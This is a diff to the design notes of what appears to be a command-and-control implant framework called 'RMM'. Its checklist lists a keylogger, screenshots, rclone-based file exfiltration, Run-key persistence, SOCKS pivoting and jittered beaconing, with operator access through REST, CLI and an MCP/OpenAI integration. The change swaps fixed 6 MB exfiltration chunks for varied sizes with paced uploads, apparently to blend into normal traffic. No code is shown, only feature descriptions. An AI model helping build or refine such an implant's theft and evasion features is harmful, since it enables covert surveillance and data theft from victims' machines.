@@ -118,7 +118,7 @@ Runtime artifacts: `RMM_logs/{downloads,screenshots,keylogs}`, `~/.rmm_cli_state
 - [x] CMD execution — temp `.cmd` batch file + `WorkingDirectory` (no `/S /c ""` or embedded `cd /d`)
 - [x] Internal commands: `__DOWNLOAD__`, `__EXFIL__`, `__UPLOAD__`, `__SCREENSHOT__`, `__KEYLOG__`, `__INSTALL_PERSIST__`, `__REMOVE_PERSIST__`, `__STOP__`, `__CONFIG__`
 - [x] `__EXFIL__` — bootstrap rclone from server, ephemeral `RCLONE_CONFIG_*` env, `rclone copyto` / `rclone copy` (folders) + optional `link`; live `exfil_progress` POSTs during upload
-- [x] Chunked exfil (`Send-RmmFileDownload`, 6 MB chunks → `file_upload` with `remote_path` metadata; live `download_progress` POSTs; **paced by default** like beacon — `$downloadBurst` / `RMM_DOWNLOAD_BURST` for burst mode)
+- [x] Chunked exfil (`Send-RmmFileDownload`, varied **2 / 5 / 10 / 20 MB** chunks → `POST /result` `file_upload`; live `download_progress` POSTs; **paced by default** — `$downloadBurst` / `RMM_DOWNLOAD_BURST` for burst mode)
 - [x] Keylogger job (`__KEYLOG__ start|stop|dump`) → temp file → `keylog` result type
 - [x] Persistence installer copies script to `%APPDATA%` + Run key (with current URL/sleep/jitter)
 - [x] SOCKS: `Sync-RmmSocksChannelFromServer` on `socks_active` from `/cmd`; dedicated runspace worker
@@ -240,7 +240,7 @@ Runtime artifacts: `RMM_logs/{downloads,screenshots,keylogs}`, `~/.rmm_cli_state
 | WS receive | Never cancel `ClientWebSocket.ReceiveAsync` (Aborted state on .NET) |
 | Task order | Server returns connect/close before send; agent sorts connect → send → close |
 | SOCKS bind | Listener on **RMM server** host; tools use `socks5://127.0.0.1:port` there |
-| Downloads | 6 MB chunks, `upload_id` + `offset` + `eof`; server stages `.part` files; agent paces chunks by default (`$downloadBurst`) |
+| Downloads | Varied chunk sizes (2 / 5 / 10 / 20 MB raw) on `POST /result` `file_upload`; `upload_id` + `offset` + `eof`; paced by default (`$downloadBurst`) |
 | Register sync | First `/register` sends `s`, `j`, `sync=1` so server adopts client script timing |
 | Operator surfaces | New features should land REST → CLI → MCP together (`rmm_tools.py`) |
 | AI | OpenAI key from browser; server spawns MCP locally; Exegol optional |
